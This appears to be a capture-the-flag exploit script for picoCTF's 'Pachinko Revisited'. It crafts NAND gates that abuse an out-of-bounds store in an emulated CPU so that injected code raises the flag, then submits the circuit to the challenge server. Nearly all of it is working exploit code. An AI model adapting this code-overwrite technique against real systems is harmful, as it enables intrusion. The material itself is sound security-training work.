"""478 Pachinko Revisited — exploit.

Reconstructed from the measured ISA (see writeup) and the public picoCTF 2025
writeup by unvariant:

  nand_checker.bin stores its NAND result at  0x2000 + 2*out_node (mod 0x10000)
  so a circuit gate whose out node is 0xf000 writes to address 0x0000-relative
  code: 0xf000+38 -> 0x4c, 0xf000+39 -> 0x4e, ...

  Plan: use the nand circuit's own store primitive to plant flag.bin's ten
  16-bit words at 0x4c..0x5e, i.e. at the instructions that the program runs
  right after the gate-processing loop.  Those words are
      load_imm r0,0x6f73 / r1,0x6563 / r2,0x2e69 / r3,0x6f00
      flag_magic
      halt
  which raises the CPU's `flag` output -> /check answers with FLAG2.
"""
import sys, json, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()

HOST = sys.argv[1] if len(sys.argv) > 1 else "http://chatelaine.cylabacademy.net:15656"


def con(a, b, o):
    return {"input1": a, "input2": b, "output": o}


def num(n, const, dest):
    """Materialise the 16-bit constant n at circuit node `dest` using only NANDs."""
    r = []
    for bit in f"{n:0b}"[1:]:
        r.append(con(dest, dest, dest))          # dest = ~dest
        if bit == "1":
            r.append(con(0 + const, dest, dest))  # dest = ~(K & dest)
    return r


def write(base, node, n):
    """Emit gates that store the 16-bit value n through node `node` (0xf000+k)."""
    total = base - 4 + node.bit_length() + node.bit_count() + n.bit_length() + n.bit_count()
    total *= 3
    const = total + 3
    return [
        *num(node, 0x800 + const, 0x800 + total + 2),
        *num(n, 0x800 + const, 0x800 + const + 1),
        con(0xff0, 0x800 + const + 1, 1),
        con(1, 1, 1),
    ]


A, B = 0, 6
TARGET = A + 10 * 3
circ = [
    con(0xfff, 0xfff, 0xfff),
    con(0xfff, 0xfff, 0xfff),
    con(0x22, 0x101, 0x101),
    con(0x800 + A + 0, 0x800 + A + 1, 0x800 + TARGET + 2),
    con(0x800 + A + 2, 0x800 + A + 3, 0x800 + TARGET + 2),
    con(0x800 + A + 4, 0x800 + A + 5, 0x800 + TARGET + 2),
    con(0x800 + TARGET + 2, 0x800 + TARGET + 2, 0x800 + TARGET + 2),
    con(0x800 + B + 0, 0x800 + B + 0, 0x800 + B + 0),
    con(0x800 + TARGET + 2, 0x800 + B + 0, 0x800 + TARGET + 2),
    con(0x800 + B + 1, 0x800 + B + 1, 0x800 + B + 2),
    con(0x800 + B + 2, 0x800 + B + 2, 1),
]
# flag.bin, one 16-bit word per instruction slot starting at code address 0x4c
for k, word in enumerate((0x0d, 0x6f73, 0x1d, 0x6563, 0x2d, 0x2e69,
                          0x3d, 0x6f00, 0x0e, 0x0f)):
    circ.extend(write(len(circ), 0xf000 + 38 + k, word))

print("gates:", len(circ), " budget:", (0x10000 - 0x3000) // 6)
r = requests.post(HOST + "/check", json={"circuit": circ}, timeout=180)
print("status:", r.status_code)
print("body:", r.text[:600])
try:
    print("json:", r.json())
except Exception:
    pass
